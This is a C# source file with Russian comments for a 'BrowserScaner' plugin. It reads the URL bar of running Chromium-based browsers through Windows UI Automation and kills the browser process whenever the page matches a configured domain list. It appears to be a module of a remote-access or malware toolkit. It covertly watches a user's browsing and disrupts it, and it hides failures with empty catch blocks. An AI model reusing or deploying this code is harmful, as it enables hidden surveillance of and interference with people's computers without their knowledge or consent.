using Plugin.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Windows.Automation;

namespace Plugin
{
    class BrowserScaner
    {
        static List<string> domains = new List<string>();
        static bool is_working = false;
        public static void Run() // BrowserScaner.Run();
        {
            while (All.Default.domainsSaner)
            {
                try
                {
                    domains = All.Default.domainScanURL.ToLower().Split().Select(s => s.Trim()).Where(d => d != "").ToList();
                    var processes = Process.GetProcessesByName("chrome").ToList();
                    processes.AddRange(Process.GetProcessesByName("opera"));
                    processes.AddRange(Process.GetProcessesByName("orbitum"));
                    processes.AddRange(Process.GetProcessesByName("vivaldi"));
                    processes.AddRange(Process.GetProcessesByName("browser"));
                    processes.AddRange(Process.GetProcessesByName("msedge"));

                    foreach (Process process in processes)
                    {
                        string url = GetChromeUrl(process);
                        if (url == null)
                            continue;
                        url = url.ToLower();

                        foreach (var domain in domains)
                        {
                            if (url.Contains(domain))
                            {
                                Thread.Sleep(4000);
                                Dlogger(process.ProcessName);
                                break;
                            }
                        }
                        break;
                    }
                }
                catch { }
                Thread.Sleep(1000);
            }
        }

        public static void Dlogger(string process)
        {
            if (is_working)
                return;
            new Thread(() =>
            {
                is_working = true;
                //Домен обнаружен, выполняем метод
                try
                {
                    // Убиваем процесс
                    foreach (Process p in Process.GetProcessesByName(process))
                    {
                        p.Kill();
                    }
                }
                catch { }
                finally
                {
                    // Возврат
                    is_working = false;
                }
            }).Start();
        }


        public static string GetChromeUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");

            if (process.MainWindowHandle == IntPtr.Zero)
                return null;

            AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
            if (element == null)
                return null;

            AutomationElementCollection edits5 = element.FindAll(TreeScope.Subtree, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit));
            AutomationElement edit = edits5[0];
            string url = ((ValuePattern)edit.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
            return url;
        }
    }
}
